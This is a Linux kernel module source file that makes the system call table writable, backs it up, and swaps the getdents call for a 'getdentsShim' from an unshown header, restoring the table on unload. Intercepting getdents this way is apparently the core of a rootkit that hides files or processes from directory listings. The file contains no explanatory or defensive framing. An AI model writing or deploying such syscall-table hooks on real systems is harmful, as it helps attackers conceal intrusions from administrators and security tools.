#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"

//new system calls
#include "getdentsShim.h"

MODULE_LICENSE("GPL");

syscall backup_sys_call_table[SYS_TABLE_LENGTH];

void patch(int callnum, void* newcall) {
	sys_call_table[callnum] = (syscall)newcall;
}

int init_module() {
	make_rw(sys_call_table);
	//make a backup of the system call table
	memcpy(backup_sys_call_table, sys_call_table, sizeof(backup_sys_call_table));

	//shim the syscalls
	patch(SYS_getdents, getdentsShim);

	printk(KERN_INFO "Module loaded\n");
	return 0;
}

void cleanup_module() {
	//restore the system call table
	memcpy(sys_call_table, backup_sys_call_table, sizeof(backup_sys_call_table));
	printk(KERN_INFO "Module unloaded\n");
}
